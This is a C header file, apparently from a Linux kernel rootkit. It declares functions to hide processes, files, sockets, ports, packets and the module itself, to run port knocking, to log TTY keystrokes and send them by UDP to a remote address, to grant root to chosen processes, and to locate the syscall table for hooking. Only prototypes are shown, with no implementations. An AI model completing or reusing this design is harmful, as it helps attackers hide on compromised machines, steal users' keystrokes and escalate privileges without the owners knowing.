#ifndef HOOK_H
#define HOOK_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h> /* for kallsyms */

#include <linux/proc_fs.h>
#include <linux/mutex.h> /* mutex semaphor and locks */

#include <linux/mount.h> /* LOOKUP_FOLLOW ? */

#include <linux/namei.h> /* kernel_path ? */
#include <linux/path.h> /* path structure ? */

#include <asm/uaccess.h> /* for get and put usert funcs */

#include <asm/unistd.h> /* contains syscall numbers */

#include <linux/slab.h> /* kmalloc and kfree */
/* struct dirent */
#include <linux/dirent.h>

/* Character device definitions */
#include <linux/fs.h>

#define DEBUG(f_, ...) printk(KERN_INFO f_, ##__VA_ARGS__)

/************ Locks **************/
void inc_critical(struct mutex *lock, int *counter);
void dec_critical(struct mutex *lock, int *counter);

/****** IOCTL Prototypes ******/
void initialize_ioctl_device(void);
void remove_ioctl_device(void);

/****** hiding processes Prototypes *****/
void initialize_process_hiding(void);
void remove_process_hiding(void);
int add_pid_to_hide(pid_t pid);
void remove_pid_to_hide(pid_t pid);
void turn_child_hiding_off(void);
void turn_child_hiding_on(void);

/******** hiding files with prefixes prototypes ****/
void initialize_hiding_files(void);
void remove_hiding_files(void);

/***************** TTY ************************/
void initialize_tty(void);
void remove_tty(void);

/******** hiding module from the system *******/
void initialize_hiding_module(void);
void remove_hiding_module(void);

/********* Port Knocking ********/
void port_knocking_init(void);
void port_knocking_exit(void);

/*********** Socket hiding *******************/
void initialize_socket_hiding(void);
void remove_socket_hiding(void);

int add_socket_to_hide(int protocol_type, int port);
void remove_port_from_hiding(int port);

/*********** Hook read **********************/
void initialize_read(void);
void remove_read(void);

/*********** hide packets read **********************/
void initialize_hide_packets(void);
void remove_hide_packets(void);

void packet_hide(char *protocol, char *ip);
void packet_unhide(char *protocol, char *ip);

/********* port knocking ****************/
void initialize_port_knocking(void);
void remove_port_knocking(void);

void port_hide(int port);
void port_unhide(int port);

/*********** Key logging ********/
void initialize_keylogger(char *local_ip_v4, char *remote_ip_v4);
void remove_keylogger(void);
void send_udp(const char* buf); // for tty logging
void turn_keylogging_off(void) ;
void turn_keylogging_on(void); 

/************* privileges escalation *********************/
void initialize_privileged_tasks(void);
void cleanup_privileged_tasks(void);

void give_root(unsigned int pid);
void redo_root(unsigned int pid);


/*********** find syscall table ****************/
unsigned long* afw_locate_sys_call_table(void);

#endif /* MODULE_H */
